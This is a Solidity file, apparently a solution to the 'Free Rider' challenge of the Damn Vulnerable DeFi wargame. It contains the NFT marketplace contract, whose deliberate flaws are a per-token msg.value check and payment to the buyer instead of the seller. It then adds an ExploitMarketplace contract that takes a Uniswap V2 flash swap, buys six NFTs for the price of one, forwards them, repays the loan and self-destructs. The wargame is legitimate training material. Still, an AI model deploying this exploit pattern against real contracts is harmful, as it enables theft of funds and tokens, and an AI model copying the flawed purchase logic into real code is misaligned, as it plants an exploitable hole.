// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "@openzeppelin/contracts/utils/Address.sol";
import "@openzeppelin/contracts/security/ReentrancyGuard.sol";
import "../DamnValuableNFT.sol";
import "./IUniswapV2Pair.sol";

import "./IWETH.sol";
import "@openzeppelin/contracts/token/ERC721/utils/ERC721Holder.sol";

/**
 * @title FreeRiderNFTMarketplace
 * @author Damn Vulnerable DeFi (https://damnvulnerabledefi.xyz)
 */
contract FreeRiderNFTMarketplace is ReentrancyGuard {

    using Address for address payable;

    DamnValuableNFT public token;
    uint256 public amountOfOffers;

    // tokenId -> price
    mapping(uint256 => uint256) private offers;

    event NFTOffered(address indexed offerer, uint256 tokenId, uint256 price);
    event NFTBought(address indexed buyer, uint256 tokenId, uint256 price);
    
    constructor(uint8 amountToMint) payable {
        require(amountToMint < 256, "Cannot mint that many tokens");
        token = new DamnValuableNFT();

        for(uint8 i = 0; i < amountToMint; i++) {
            token.safeMint(msg.sender);
        }        
    }

    function offerMany(uint256[] calldata tokenIds, uint256[] calldata prices) external nonReentrant {
        require(tokenIds.length > 0 && tokenIds.length == prices.length);
        for (uint256 i = 0; i < tokenIds.length; i++) {
            _offerOne(tokenIds[i], prices[i]);
        }
    }

    function _offerOne(uint256 tokenId, uint256 price) private {
        require(price > 0, "Price must be greater than zero");

        require(
            msg.sender == token.ownerOf(tokenId),
            "Account offering must be the owner"
        );

        require(
            token.getApproved(tokenId) == address(this) ||
            token.isApprovedForAll(msg.sender, address(this)),
            "Account offering must have approved transfer"
        );

        offers[tokenId] = price;

        amountOfOffers++;

        emit NFTOffered(msg.sender, tokenId, price);
    }

    function buyMany(uint256[] calldata tokenIds) external payable nonReentrant {
        for (uint256 i = 0; i < tokenIds.length; i++) {
            _buyOne(tokenIds[i]);
        }
    }

    function _buyOne(uint256 tokenId) private {       
        uint256 priceToPay = offers[tokenId];
        require(priceToPay > 0, "Token is not being offered");

        require(msg.value >= priceToPay, "Amount paid is not enough");

        amountOfOffers--;

        // transfer from seller to buyer
        token.safeTransferFrom(token.ownerOf(tokenId), msg.sender, tokenId);

        // pay seller
        payable(token.ownerOf(tokenId)).sendValue(priceToPay);

        emit NFTBought(msg.sender, tokenId, priceToPay);
    }    

    receive() external payable {}
}

contract ExploitMarketplace is ERC721Holder {
    IUniswapV2Pair pair;
    FreeRiderNFTMarketplace marketplace;
    // DamnValuableNFT public token;

    address public buyer ; 
    address payable public  owner ; 

    constructor( IUniswapV2Pair _pair, FreeRiderNFTMarketplace _marketplace , address _buyer) { 
        pair = _pair; 
        marketplace = _marketplace;
    
        owner = payable(msg.sender);
        buyer = _buyer; 
    }

    event Log(string message, uint value); 

    function exploit(uint _nftPrice) external { 
        bytes memory data = abi.encode(pair.token0(), _nftPrice);
        pair.swap(_nftPrice, 0 , address(this), data);
    }

    function uniswapV2Call(address sender, uint amount0, uint amount1, bytes calldata data) external  {
        require(msg.sender == address(pair)); 
        require(sender == address(this)); 
        
        (address payable tokenBorrow, uint amount) = abi.decode(data, (address, uint)); 
        
        uint256 fee = ((amount * 3) / 997) + 1; 
        uint256 amountToRepay = amount + fee; 

        IWETH weth = IWETH(tokenBorrow);
        // withdraw the loan of amount
        weth.withdraw(amount);

        // now pay for one nft inside nft marketplace;
        uint256 length = 6; 
        uint256[] memory tokenIds = new uint[](length); 
        for(uint i ; i < length; ++i ) {
            tokenIds[i] = i ; 
        }
        marketplace.buyMany{value: amount}(tokenIds);
        DamnValuableNFT nft = DamnValuableNFT(marketplace.token());

        for(uint256 tokenId ; tokenId < length; ++tokenId) {
            require(nft.ownerOf(tokenId) == address(this), "you are not the owner");
            nft.safeTransferFrom(address(this), buyer, tokenId );
        }
        weth.deposit{value: amountToRepay}(); 
        
        weth.transfer(address(pair), amountToRepay);

        emit Log("amount", amount);
        emit Log("amount0", amount0);
        emit Log("amount1", amount1);

        
        selfdestruct(owner);

    }

    receive() external payable {}

}